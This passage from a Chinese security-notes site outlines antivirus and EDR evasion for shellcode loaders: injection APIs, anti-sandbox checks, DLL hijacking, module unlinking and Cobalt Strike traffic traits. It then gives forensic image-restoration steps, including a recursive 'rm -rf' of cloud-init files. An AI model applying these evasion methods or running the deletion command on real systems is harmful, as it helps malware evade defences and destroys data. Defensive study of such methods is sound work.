+<li>shellcode写入内存<ul>
+<li>RtlMoveMemory</li>
+<li>RtlCopyMemory</li>
+</ul>
+</li>
+<li>执行该内存<ul>
+<li>EnumSystemLocalesA</li>
+<li>CreateThread</li>
+<li>WaitForSingleObject</li>
+</ul>
+</li>
+<li><a href="https://github.com/0xsp-SRD/ZigStrike">https://github.com/0xsp-SRD/ZigStrike</a></li>
+<li>函数替换<ul>
+<li><a href="http://ropgadget.com/posts/abusing_win_functions.html">http://ropgadget.com/posts/abusing_win_functions.html</a></li>
+</ul>
+</li>
+<li>加载器内部执行<ul>
+<li>容易规避杀软的检测</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>动态查杀<ul>
+<li>沙箱</li>
+<li>内存检测</li>
+<li>免杀</li>
+<li>反沙箱<ul>
+<li>开机时间</li>
+<li>物理内存</li>
+<li>cpu个数</li>
+<li>Tmep文件个数</li>
+<li>随机字符串服务器校验</li>
+<li>usb记录</li>
+<li>样本名称</li>
+<li>硬盘大小</li>
+<li>能否联网</li>
+<li>能否使用命名管道</li>
+</ul>
+</li>
+<li>动态内存加载<ul>
+<li>inline hook sleep</li>
+<li>hook后自定义sleep函数逻辑</li>
+<li>CreateTimerQueueTimer</li>
+</ul>
+</li>
+<li>远程线程注入<ul>
+<li>CreateRemoteThread</li>
+<li>OpenProcess</li>
+<li>VirtualAllocEx</li>
+<li>WriteProcessMemory</li>
+</ul>
+</li>
+<li>APC注入<ul>
+<li>apc+间接系统调用+模块踩踏</li>
+<li>QueueUserApc</li>
+<li>Early Bird</li>
+</ul>
+</li>
+<li>自研rat<ul>
+<li>分离功能</li>
+</ul>
+</li>
+<li>dll劫持<ul>
+<li>winsxs dll劫持</li>
+<li>microsoft组件劫持</li>
+<li>onedrive</li>
+<li>dll劫持自动化脚本</li>
+</ul>
+</li>
+<li>回调<ul>
+<li>EnumChildWindows</li>
+<li>AlternativeShellcodeExec</li>
+</ul>
+</li>
+<li>llvm混淆<ul>
+<li><a href="https://github.com/KomiMoe/Arkari">https://github.com/KomiMoe/Arkari</a></li>
+</ul>
+</li>
+<li>打断进程链<ul>
+<li>3环</li>
+<li>ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte-&gt;InInitializationOrderModuleList.Flink;</li>
+<li>ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte-&gt;InInitializationOrderModuleList.Blink;</li>
+<li>0环</li>
+<li>PsActiveProcessHead-&gt;Eprocess</li>
+</ul>
+</li>
+<li>注入其他进程<ul>
+<li>被杀不死加载器</li>
+</ul>
+</li>
+<li>内核注入<ul>
+<li><a href="https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/">https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>流量查杀<ul>
+<li>流量特征</li>
+<li>固定通信协议加密字段<ul>
+<li>cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信</li>
+</ul>
+</li>
+<li>内容特征</li>
+<li>data字段是否存在命令相关的关键词加密特征</li>
+<li>结构特征</li>
+<li>固定字段特征</li>
+<li>ip</li>
+</ul>
+</li>
+</ul>
+<h2 id="_86">**调证镜像系统还原 **</h2>
+<h3 id="linux_1">linux</h3>
+<h4 id="_87">恢复镜像</h4>
+<ul>
+<li><a href="https://qemu.weilnetz.de/w64/">https://qemu.weilnetz.de/w64/</a></li>
+<li>qemu-img convert -f raw 要转换的.raw -O vmdk 生成的.vmdk</li>
+</ul>
+<h4 id="_88">修改虚拟机配置</h4>
+<ul>
+<li>选使用现用磁盘</li>
+</ul>
+<h4 id="_89">修改密码</h4>
+<ul>
+<li>在启动页面选中第一个，按e键进入单用户模式</li>
+<li>把ro后面的部分全部删掉，改为rw init=/bin/bash</li>
+<li>删除阿里云cloud init</li>
+<li>rm -rf $(find / 2&gt;/dev/null|grep cloud-init)</li>
+<li>passwd</li>
+<li>修改密码</li>
+</ul>
+<h4 id="_90">修改网络</h4>
+<ul>
+<li>ip a</li>
+<li>dhclient eth0</li>
+<li>网络选择仅主机</li>
+</ul>
+<h4 id="_91">查看历史命令</h4>
+<h4 id="_92">查看服务</h4>
+<h4 id="_93">服务对应文件</h4>
+<h2 id="hw">hw</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../ch-24/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 24. 过时内容警告与替代方案">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                24. 过时内容警告与替代方案
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top", "navigation.tracking", "navigation.footer", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
